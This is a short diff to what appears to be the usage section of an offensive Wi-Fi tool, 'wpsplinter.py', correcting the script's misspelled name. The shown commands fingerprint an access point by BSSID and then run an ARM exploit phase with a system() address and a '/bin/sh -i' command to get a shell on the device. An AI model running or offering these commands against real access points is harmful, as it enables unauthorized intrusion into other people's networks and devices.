@@ -4,10 +4,10 @@
 
 ```bash
 # 1. Fingerprint target
-python3 wpslinter.py --iface wlan0 --bssid AA:BB:CC:DD:EE:FF --ssid "Network" --phase fingerprint
+python3 wpsplinter.py --iface wlan0 --bssid AA:BB:CC:DD:EE:FF --ssid "Network" --phase fingerprint
 
 # 2. If vulnerable, exploit (ARM)
-python3 wpslinter.py --iface wlan0 --bssid AA:BB:CC:DD:EE:FF --ssid "Network" \
+python3 wpsplinter.py --iface wlan0 --bssid AA:BB:CC:DD:EE:FF --ssid "Network" \
     --phase exploit_arm --arch arm --system_plt 0x27683 --cmd "/bin/sh -i"
 ```
 
